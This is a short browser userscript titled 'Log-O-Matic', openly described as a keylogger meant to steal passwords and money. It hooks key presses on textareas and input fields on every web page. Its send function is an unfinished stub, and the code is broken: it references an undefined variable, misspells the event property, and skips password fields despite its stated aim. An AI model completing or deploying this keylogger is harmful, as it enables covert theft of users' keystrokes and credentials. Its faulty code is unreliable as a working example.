// ==UserScript==
// @name          Log-O-Matic
// @description   A keylogger to steal your password and money ^^
// @include       http*://*
// ==/UserScript==

var collected_data="";
function collect(event){ collected_data+="/"+event.keyCode;}
function send_home(){ /* use GM_xmlhttprequest here to send collected_data */}
var textareas = document.getElementsByTagName("textarea");
for(i in textareas) {
    textareas[i].onKeyPress=collect;
}
var inputs = document.getElementsByTagName("input");
for(i in input) {
    if(input[i].type!="password")input[i].onKeyPress=collect;
}